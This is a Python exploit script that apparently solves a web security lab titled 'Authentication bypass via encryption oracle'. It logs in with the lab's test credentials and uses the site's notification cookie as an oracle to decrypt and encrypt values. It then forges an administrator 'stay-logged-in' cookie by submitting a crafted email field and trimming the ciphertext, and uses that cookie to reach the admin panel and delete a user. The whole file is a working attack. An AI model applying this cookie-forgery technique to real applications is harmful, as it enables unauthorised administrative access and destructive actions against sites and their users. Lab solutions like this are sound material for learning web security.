import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
import urllib.parse
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {'name' : 'csrf'})['value']
    return csrf_token


def delete_user(s, url):
    # LOgIN AS USER 'WIENER'
    print("[+] Login as the user wiener")
    login_url = url + '/login'
    params = {
        'csrf' : get_csrf(s, login_url),
        'username' : 'wiener',
        'password' : 'peter',
        'stay-logged-in' : 'on'
    }
    r = s.post(login_url, data=params, allow_redirects=False, verify=False, proxies=proxies)

    # CHECK IF LOGIN WAS SUCCESSFUL
    if r.status_code != 302:
        print("[-] Could not log-in as the user wiener")
        sys.exit(-1)
    print("[+] Logged-in!")
    # PASS THE CONTENT OF THE COOKIE STAY-LOGGED-IN AS THE NOTIFICATION COOKIE
    # VALID FOR /POST - GET REQUESTS
    post_url = url + '/post?postId=1'
    cookies = {
        'notification' : r.cookies.get_dict()['stay-logged-in'],
    }
    r = s.get(post_url, cookies=cookies, verify=False, proxies=proxies)

    # CHECK IF GET REQUEST WAS SUCCESSFUL
    if r.status_code != 200:
        print("[-] Error while requesting the page")
        sys.exit(-1)
    print("[+] Passed the 'stay-logged-in' (ciphertext) cookie content as content of the 'notification' cookie.")
    print("[+] Fetching now the plaintext...")

    # FETCH PLAINTEXT COOKIE CONTENT
    soup = BeautifulSoup(r.text, "html.parser")
    plaintext_entry = soup.find("header", {'class': 'notification-header'})
    refined_plaintext_entry = re.search(r"\w+:(\d+)", str(plaintext_entry))
    plaintext_cookie = refined_plaintext_entry.group(0)
    timestamp = refined_plaintext_entry.group(1)
    print("[+] Plaintext is {0}, noting the syntax... and storing the timestamp {1}... we'll need it later".format(plaintext_cookie, timestamp))

    # FORGE A NEW STAY-LOGGED-IN COOKIE USING POST REQUESTS FOR /POST?POSTID=[ID]
    # POSTING A WRONG EMAIL SYNTAX GENERATES AND ENCODED NOTIFICATION COOKIE WHICH IS
    # 'INVALID EMAIL ADDRESS: [XXX]'
    comment_url = url + '/post/comment'
    params = {
        'csrf' : get_csrf(s, post_url),
        'postId' : 1,
        'comment' : 'test',
        'name' : 'test',
        'email' : 'xxxxxxxxxadministrator:' + timestamp,
        'website' : 'http://www.test.test'
    }
    r = s.post(comment_url, data=params, allow_redirects=False, verify=False, proxies=proxies)

    # CHECK IF POST WENT WELL
    if r.status_code != 302:
        print("[-] Error")
        sys.exit(-1)
    print("[+] Comment posted!")

    # MODIFY THE FORGED COOKIE
    # WE NEED TO URL-DECODE IT, THEN BASE64-DECODE IT, DELETE THE FIRST 32 BYTES
    # BECAUSE SENDING A MALFORMED COOKIE VIA GET IN ORDER TO DECRYPT IT
    # FORMED AS 'USERNAME:TIMESTAMP' ONLY, RETURNS AN ERROR 
    # Input length must be multiple of 16 when decrypting with padded cipher
    # THAT'S THE REASON BEHIND THE 9 TIMES x USED BEFORE

    forged_cookie = r.cookies.get_dict()['notification']
    # URL DECODE
    forged_cookie_ud = urllib.parse.unquote(forged_cookie)
    # BASE64 DECODE
    forged_cookie_ud_bytes = base64.b64decode(forged_cookie_ud)
    # TURN BYTE FILE IN BYTEARRAY
    fcookie_bytearray = bytearray(forged_cookie_ud_bytes)
    for i in range(0, 32, 1):
        del fcookie_bytearray[0]
    # BASE64 ENCODE
    forged_cookie_ud_bytes = base64.b64encode(fcookie_bytearray)
    # URL ENCODE
    forged_cookie = urllib.parse.quote(forged_cookie_ud_bytes)

    # PASS THE FORGED COOKIE AS STAY-LOGGED-IN COOKIE VALUE
    # DO NOT USE 'S' (SESSION) TO PREVENT REUSE OF PREVIOUS COOKIES
    admin_url = url + '/admin'
    cookies = {
        'stay-logged-in' : forged_cookie
    }
    r = requests.get(admin_url, cookies=cookies, verify=False, proxies=proxies)

    # CHECK IF LOGIN WAS SUCCESSFUL
    if "Admin panel" not in r.text:
        print("[-] The forged cookie did not work. Debug the script and try again")
        sys.exit(-1)
    print("[+] Perfect! We are logged in as administrator meaning the forged cookie worked!")

    # DELETE USER CARLOS
    delete_url = url + '/admin/delete?username=carlos'
    cookies = {
        'stay-logged-in' : forged_cookie
    }
    r = requests.get(delete_url, cookies=cookies, verify=False, proxies=proxies)
    if "User deleted successfully!" not in r.text:
        print("[-] Could not delete the user carlos")
        sys.exit(-1)
    print("[+] Exploit worked!")


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    url = sys.argv[1].strip()
    print("[+] Lab: Authentication bypass via encryption oracle")
    print("""This lab contains a logic flaw that exposes an encryption oracle to users.
    To solve the lab, exploit this flaw to gain access to the admin panel and delete Carlos.
    You can log in to your own account using the following credentials: wiener:peter
""")

    delete_user(s, url)


if __name__ == "__main__":
    main()